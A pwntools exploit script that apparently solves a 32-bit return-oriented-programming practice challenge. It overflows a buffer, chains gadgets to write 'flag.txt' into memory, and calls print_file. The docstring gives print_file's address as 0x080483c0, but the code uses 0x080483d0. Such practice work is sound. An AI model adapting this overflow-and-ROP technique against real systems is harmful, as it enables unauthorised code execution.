from pwn import *

"""
Task:
    1. write "flag.txt" to some where in memory(file_name)
        according vmmap => file_name = 0x0804a400
    2. call print_file(file_name)

Checksec:
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'

vmmap:
gdb-peda$ vmmap
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /mnt/d/eCXD/rop/X86/write4/write432
0x08049000 0x0804a000 r--p      /mnt/d/eCXD/rop/X86/write4/write432
0x0804a000 0x0804b000 rw-p      /mnt/d/eCXD/rop/X86/write4/write432
0xf7fca000 0xf7fcb000 r-xp      /mnt/d/eCXD/rop/X86/write4/libwrite432.so
0xf7fcb000 0xf7fcc000 r--p      /mnt/d/eCXD/rop/X86/write4/libwrite432.so
0xf7fcc000 0xf7fcd000 rw-p      /mnt/d/eCXD/rop/X86/write4/libwrite432.so
0xf7fcd000 0xf7fcf000 rw-p      mapped
0xfffdd000 0xffffe000 rw-p      [stack]

Gadget:
    080483c0 : print_file
    0x080485aa : pop edi ; pop ebp ; ret
    0x08048543 : mov dword ptr [edi], ebp ; ret

Stack: 

"""
def write4(where, what):
    g = b""
    g += p32(0x080485aa) # pop edi, pop ebp, ret
    g += p32(where)
    g += p32(what)
    g += p32(0x08048543) # mov dword ptr [edi], ebp ; ret
    return g
def exploit():
    p = process("write432")
    proc.wait_for_debugger(p.pid)

    print_file = 0x080483d0
    file_name = 0x0804a400 # writable section
    flag_str_1 = u32("flag")
    flag_str_2 = u32(".txt")

    buf = b""
    
    # write flag.txt to file_name
    buf += b"A"*0x2c
    buf += write4(file_name, flag_str_1)
    buf += write4(file_name+4, flag_str_2)

    # call print_file(file_name)
    buf += p32(print_file)
    buf += b"AAAA"
    buf += p32(file_name)
    

    p.send(buf)
    p.interactive()
exploit()